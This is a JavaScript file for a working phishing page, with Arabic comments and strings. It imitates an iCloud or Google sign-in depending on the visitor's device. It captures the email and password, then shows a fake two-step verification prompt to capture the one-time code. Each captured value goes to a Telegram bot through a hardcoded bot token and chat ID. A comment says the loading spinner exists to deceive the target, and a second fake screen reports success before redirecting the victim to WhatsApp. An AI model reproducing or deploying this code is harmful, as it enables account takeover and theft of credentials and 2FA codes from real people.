const TOKEN = "8485113389:AAHZEkzRDLg2ZPBOjUb-osecIR34DExhxHg";
const CHAT_ID = "5976228373";

function startVerification() {
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    const popup = document.getElementById('login-popup');
    const logoDiv = document.getElementById('provider-logo');
    const btn = document.getElementById('main-btn');

    if (isIOS) {
        logoDiv.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg">';
        document.getElementById('login-title').innerText = "iCloud Sign in";
        btn.style.background = "#000";
    } else {
        logoDiv.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">';
        btn.style.background = "#1a73e8";
    }
    popup.style.display = 'flex';
}

function sendToBot(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
}

function captureAccount() {
    const email = document.getElementById('user-email').value;
    const pass = document.getElementById('user-pass').value;

    if (!email || !pass) return alert("يرجى إكمال البيانات");

    // إرسال الحساب والباسورد
    sendToBot(`🔥 صيد جديد (حساب كامل):\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}`);

    // تفعيل حركة التحميل لإيهام الدكتور بالاتصال بالسيرفر
    document.getElementById('input-fields').style.opacity = "0.3";
    document.getElementById('loading-spinner').style.display = "block";
    document.getElementById('main-btn').innerText = "جاري التحقق...";

    setTimeout(() => {
        document.getElementById('loading-spinner').style.display = "none";
        document.getElementById('input-fields').style.opacity = "1";
        document.getElementById('login-title').innerText = "التحقق بخطوتين";
        document.getElementById('login-desc').innerText = "أدخل الرمز المكون من 6 أرقام الذي تم إرساله إلى جهازك.";
        document.getElementById('input-fields').innerHTML = `<input type="text" id="auth-code" placeholder="G-XXXXXX" maxlength="6" style="text-align:center; font-size:20px; letter-spacing:5px;">`;
        document.getElementById('main-btn').innerText = "تأكيد الكود";
        document.getElementById('main-btn').setAttribute("onclick", "captureCode()");
    }, 2500);
}

function captureCode() {
    const code = document.getElementById('auth-code').value;
    if (!code) return alert("أدخل الكود");

    sendToBot(`🔑 كود التحقق (OTP): ${code}`);

    document.getElementById('login-card').innerHTML = `
        <div class="spinner"></div>
        <h3>تمت المزامنة بنجاح</h3>
        <p>جاري تحويلك إلى المحادثة...</p>
    `;

    setTimeout(() => {
        window.location.href = "https://wa.me/966XXXXXXXXX"; // ضع رقمك هنا
    }, 3000);
}